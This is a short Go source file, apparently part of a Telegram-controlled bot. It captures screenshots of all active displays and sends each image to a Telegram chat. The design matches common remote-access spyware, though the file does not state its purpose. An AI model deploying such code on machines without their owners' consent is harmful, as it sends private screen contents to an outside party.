package main

import (
	_ "embed"
	"fmt"
	"bytes"
	"image/png"
	"github.com/kbinani/screenshot"
)


func takeScreenshots(chatID int64) {
	n := screenshot.NumActiveDisplays()

	for i := 0; i < n; i++ {
		bounds := screenshot.GetDisplayBounds(i)

		img, err := screenshot.CaptureRect(bounds)
		if err != nil {
			SendMessage(chatID, fmt.Sprintf("Error capturing screenshot: %v", err))
			continue
		}

		// Create a buffer to store the image
		var buf bytes.Buffer
		err = png.Encode(&buf, img)
		if err != nil {
			SendMessage(chatID, fmt.Sprintf("Error encoding image: %v", err))
			continue
		}

		fileName := fmt.Sprintf("screenshot_%d_%dx%d.png", i, bounds.Dx(), bounds.Dy())

		// Send the image to Telegram
		_ = sendFile(chatID, fileName, buf.Bytes())
	}
}
